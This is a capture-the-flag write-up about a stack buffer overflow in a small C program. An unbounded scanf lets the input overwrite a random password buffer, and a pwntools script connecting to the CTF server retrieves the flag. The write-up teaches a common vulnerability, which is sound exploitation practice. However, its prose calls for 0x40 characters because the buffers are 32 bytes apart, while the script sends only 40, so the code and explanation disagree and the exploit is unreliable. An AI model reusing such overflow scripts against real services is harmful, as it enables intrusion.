# No Password Here

## Challenge

We're given a small C binary with source code.

### Checksec

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

### Code.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
void main()
{
	char flag[120];
	setvbuf ( stdout, NULL , _IONBF , 0 );
	char Test[20];

	//random number based on the current time.
	//YOU WILL NEVER GUESS THE PASSWORD. HAHAHAHAHHAH
    srand(time(0));
	sprintf(Test, "%d",rand());	
	
	
    char input[20];
    printf("Enter something?");
    scanf("%s",input);

	//Check password
	if (strncmp(Test,input,20) == 0)
	{
		FILE *f = fopen("flag.txt","r");
		
		fgets(flag,100,f);
		
		printf("Password is correct! Here is your flag: %s", flag);
	}
	

}
```

## Solution

The function uses `scanf` in an unsafe way, as there is no limit on how many characters we read into `input`.

As `input` is at a lower address than `Test`, we can overwrite the randomly generated password.

The check is done using `strncmp` with a length of 20, so only up to 20 characters will be tested.

If we send 0x40 characters, we can fill both buffers with "A"s and pass the password check.
Note that we need more than just 20+20 characters, as the buffers are actually 32 bytes apart in memory.

## Exploit

```py
#!/usr/bin/env python3
from pwn import *

host = args.HOST or 'srv1.2023.magpiectf.ca'
port = int(args.PORT or 1996)

io = connect(host, port)

io.sendline(b'A' * 40)

io.interactive()
```

## Flag

```
magpie{5c4nf_n07_54f3}
```
